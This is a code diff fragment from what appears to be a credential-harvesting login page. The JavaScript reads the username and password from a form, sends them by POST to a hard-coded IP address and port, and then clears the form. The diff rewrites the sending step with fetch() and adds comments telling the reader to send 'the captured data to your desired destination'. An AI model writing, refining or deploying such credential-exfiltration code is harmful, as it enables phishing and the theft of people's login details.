@@ -22,10 +22,23 @@
       var password = form.password.value;
       var data = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
 
-      var xhr = new XMLHttpRequest();
-      xhr.open("POST", "https://192.168.10.175:1234", true);
-      xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-      xhr.send(data);
+      // You can modify the following code to send the captured data to your desired destination
+      // For example, you can use an XMLHttpRequest or fetch to send a POST request to a server-side script
+
+      // Example using fetch:
+      fetch("http://192.168.10.175:1234", {
+        method: "POST",
+        headers: {
+          "Content-type": "application/x-www-form-urlencoded"
+        },
+        body: data
+      }).then(function(response) {
+        // Handle the response from the server
+        console.log("Response received:", response);
+      }).catch(function(error) {
+        // Handle any error that occurred during the request
+        console.error("Error occurred:", error);
+      });
 
       form.reset();
     }
